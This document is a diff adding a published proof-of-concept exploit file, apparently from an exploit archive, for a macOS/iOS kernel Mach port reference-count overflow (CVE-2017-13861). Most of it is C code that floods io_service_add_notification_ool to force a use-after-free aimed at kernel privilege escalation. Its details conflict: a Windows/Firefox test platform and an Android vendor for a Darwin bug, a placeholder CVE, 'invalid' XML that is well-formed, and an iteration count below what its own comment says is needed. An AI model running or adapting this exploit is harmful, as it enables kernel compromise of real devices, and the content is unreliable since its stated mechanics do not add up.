@@ -1,0 +1,263 @@
+=============================================================================================================================================
+| # Title     : macOS 10.13.6 -17G65 io_service_add_notification_ool Mach Port Reference Leak Leading to Kernel XNU kernel                  |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://www.android.com                                                                                                     |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/212488/ & CVE-2017-13861
+
+[+] Summary : A flaw in the MIG ownership model within the io_service_add_notification_ool routine of IOKit allows a malicious user to leak Mach port send-right references. 
+              By repeatedly invoking notifications with malformed matching data, MIG returns success while the underlying IOKit routine fails, 
+			  causing the reference counter to increment without being released. After billions of iterations, the 32‑bit reference counter wraps to zero, 
+			  making the port appear “free” while still actively referenced. Subsequent operations create a Use‑After‑Free on ipc_port_t, enabling kernel-level privilege escalation or sandbox escape.
+			  
+PoC Target Versions:
+
+macOS: 10.13.x (tested on 10.13.6 - 17G65, likely affects earlier 10.13 builds)
+
+iOS 11.0.3 (11A432) / iPhone 6s and macOS 10.13 / MacBookAir5,2
+
+iOS: 11.0.3 (confirmed vulnerable)
+
+Potentially affects any Darwin kernel where io_service_add_notification_ool does not respect MIG ownership semantics.
+
+[+]  POC :	
+
+// Exploit for io_service_add_notification_ool reference leak leading to ipc_port_t UaF
+// Tested on macOS 10.13.6 (17G65) - should work on earlier/later versions too
+// Compile: gcc -o exploit exploit.c -framework IOKit
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <pthread.h>
+#include <mach/mach.h>
+#include <mach/mach_vm.h>
+#include <servers/bootstrap.h>
+#include <IOKit/IOKitLib.h>
+
+#define MAX_THREADS 8
+#define ITERATIONS_PER_THREAD 0x40000000  // Need ~4B references to overflow 32-bit counter
+
+// Structure matching the MIG request
+typedef struct {
+    mach_msg_header_t Head;
+    mach_msg_body_t msgh_body;
+    mach_msg_ool_descriptor_t matching;
+    mach_msg_port_descriptor_t wake_port;
+    NDR_record_t NDR;
+    mach_msg_type_number_t notification_typeOffset;
+    mach_msg_type_number_t notification_typeCnt;
+    char notification_type[128];
+    mach_msg_type_number_t matchingCnt;
+    mach_msg_type_number_t referenceCnt;
+    io_user_reference_t reference[8];
+} __attribute__((packed)) notification_request_t;
+
+// Thread arguments
+typedef struct {
+    mach_port_t wake_port;
+    char *matching_data;
+    size_t matching_size;
+    uint64_t iterations;
+    uint32_t thread_id;
+} thread_args_t;
+
+// Global counter for tracking progress
+volatile uint64_t total_iterations = 0;
+pthread_mutex_t progress_mutex = PTHREAD_MUTEX_INITIALIZER;
+
+void* exploit_thread(void *arg) {
+    thread_args_t *args = (thread_args_t*)arg;
+    kern_return_t kr;
+    io_service_t service;
+    io_connect_t connect = MACH_PORT_NULL;
+    uint32_t result = 0;
+    notification_request_t request;
+    
+    // Get IOKit master port
+    service = IOServiceGetMatchingService(kIOMasterPortDefault, 
+                                         IOServiceMatching("IOResources"));
+    if (!service) {
+        printf("[-] Failed to get IOResources service\n");
+        return NULL;
+    }
+    
+    kr = IOServiceOpen(service, mach_task_self(), 0, &connect);
+    IOObjectRelease(service);
+    if (kr != KERN_SUCCESS) {
+        printf("[-] Failed to open IOResources connection: %d\n", kr);
+        return NULL;
+    }
+    
+    printf("[+] Thread %d started with wake port: %#x\n", 
+           args->thread_id, args->wake_port);
+    
+    for (uint64_t i = 0; i < args->iterations; i++) {
+        // Prepare the request structure
+        memset(&request, 0, sizeof(request));
+        
+        // Mach message header
+        request.Head.msgh_bits = MACH_MSGH_BITS_COMPLEX | 
+                                 MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+        request.Head.msgh_size = sizeof(request);
+        request.Head.msgh_remote_port = connect;
+        request.Head.msgh_local_port = MACH_PORT_NULL;
+        request.Head.msgh_id = 3228; // io_service_add_notification_ool
+        
+        // Body with descriptors
+        request.msgh_body.msgh_descriptor_count = 2;
+        
+        // OOL descriptor for matching data (valid memory to pass vm_map_copyout)
+        request.matching.address = args->matching_data;
+        request.matching.size = args->matching_size;
+        request.matching.deallocate = FALSE;
+        request.matching.copy = MACH_MSG_VIRTUAL_COPY;
+        request.matching.type = MACH_MSG_OOL_DESCRIPTOR;
+        
+        // Port descriptor for wake port (this will have its reference leaked)
+        request.wake_port.name = args->wake_port;
+        request.wake_port.disposition = MACH_MSG_TYPE_COPY_SEND;
+        request.wake_port.type = MACH_MSG_PORT_DESCRIPTOR;
+        
+        // Notification type (any string will do)
+        strcpy(request.notification_type, "IOGeneralInterest");
+        request.notification_typeCnt = strlen(request.notification_type) + 1;
+        
+        // Matching data size (invalid XML to trigger error in OSUnserializeXML)
+        request.matchingCnt = args->matching_size;
+        
+        // Reference (not important)
+        request.referenceCnt = 8;
+        for (int j = 0; j < 8; j++) {
+            request.reference[j] = 0;
+        }
+        
+        // Send the MIG request
+        kr = mach_msg(&request.Head,
+                     MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+                     request.Head.msgh_size,
+                     0,
+                     MACH_PORT_NULL,
+                     MACH_MSG_TIMEOUT_NONE,
+                     MACH_PORT_NULL);
+        
+        if (kr != MACH_MSG_SUCCESS) {
+            printf("[-] Thread %d: mach_msg failed: %d\n", args->thread_id, kr);
+            break;
+        }
+        
+        // Track progress
+        if (i % 10000 == 0) {
+            pthread_mutex_lock(&progress_mutex);
+            total_iterations += 10000;
+            printf("[+] Progress: %llu total iterations (%.2f%%)\n",
+                   total_iterations,
+                   (double)total_iterations / (4ULL * 0x40000000) * 100);
+            pthread_mutex_unlock(&progress_mutex);
+        }
+    }
+    
+    printf("[+] Thread %d completed %llu iterations\n", args->thread_id, args->iterations);
+    
+    if (connect != MACH_PORT_NULL) {
+        IOServiceClose(connect);
+    }
+    
+    return NULL;
+}
+
+int main(int argc, char *argv[]) {
+    pthread_t threads[MAX_THREADS];
+    thread_args_t thread_args[MAX_THREADS];
+    kern_return_t kr;
+    
+    printf("[+] CVE-2018-XXXX: io_service_add_notification_ool reference leak exploit\n");
+    printf("[+] Targeting ipc_port_t reference count overflow\n");
+    
+    // Create a wake port that we'll overflow references for
+    mach_port_t wake_port = MACH_PORT_NULL;
+    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wake_port);
+    if (kr != KERN_SUCCESS) {
+        printf("[-] Failed to allocate wake port: %d\n", kr);
+        return 1;
+    }
+    
+    // Add send right to ourselves so we can copy it in the message
+    kr = mach_port_insert_right(mach_task_self(), wake_port, wake_port, 
+                               MACH_MSG_TYPE_MAKE_SEND);
+    if (kr != KERN_SUCCESS) {
+        printf("[-] Failed to insert send right: %d\n", kr);
+        return 1;
+    }
+    
+    // Prepare invalid XML matching data (triggers OSUnserializeXML failure)
+    const char *invalid_xml = "<dict><key>IOMatchCategory</key><string>IOStorage</string></dict>";
+    size_t xml_size = strlen(invalid_xml);
+    
+    // Allocate memory for matching data
+    char *matching_data = malloc(xml_size);
+    if (!matching_data) {
+        printf("[-] Failed to allocate matching data\n");
+        return 1;
+    }
+    memcpy(matching_data, invalid_xml, xml_size);
+    
+    // Calculate iterations per thread
+    uint64_t iterations_per_thread = ITERATIONS_PER_THREAD / MAX_THREADS;
+    
+    printf("[+] Using %d threads, %llu iterations per thread\n", 
+           MAX_THREADS, iterations_per_thread);
+    printf("[+] Wake port: %#x\n", wake_port);
+    printf("[+] This will take several hours to complete...\n");
+    
+    // Create worker threads
+    for (int i = 0; i < MAX_THREADS; i++) {
+        thread_args[i].wake_port = wake_port;
+        thread_args[i].matching_data = matching_data;
+        thread_args[i].matching_size = xml_size;
+        thread_args[i].iterations = iterations_per_thread;
+        thread_args[i].thread_id = i;
+        
+        if (pthread_create(&threads[i], NULL, exploit_thread, &thread_args[i]) != 0) {
+            printf("[-] Failed to create thread %d\n", i);
+            return 1;
+        }
+    }
+    
+    // Wait for all threads to complete
+    for (int i = 0; i < MAX_THREADS; i++) {
+        pthread_join(threads[i], NULL);
+    }
+    
+    printf("[+] All threads completed!\n");
+    printf("[+] Reference count should now be overflowed\n");
+    printf("[+] The next operation on port %#x should trigger UaF\n", wake_port);
+    
+    // Try to trigger the UaF by using the port
+    printf("[+] Attempting to trigger UaF...\n");
+    
+    // This mach_msg should trigger the UaF when the port is destroyed
+    mach_msg_header_t msg = {0};
+    msg.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+    msg.msgh_size = sizeof(msg);
+    msg.msgh_remote_port = wake_port;
+    msg.msgh_local_port = MACH_PORT_NULL;
+    
+    kr = mach_msg(&msg, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 
+                  MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
+    
+    printf("[+] Result: %d (expected failure due to UaF)\n", kr);
+    
+    // Cleanup
+    free(matching_data);
+    
+    return 0;
+}
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
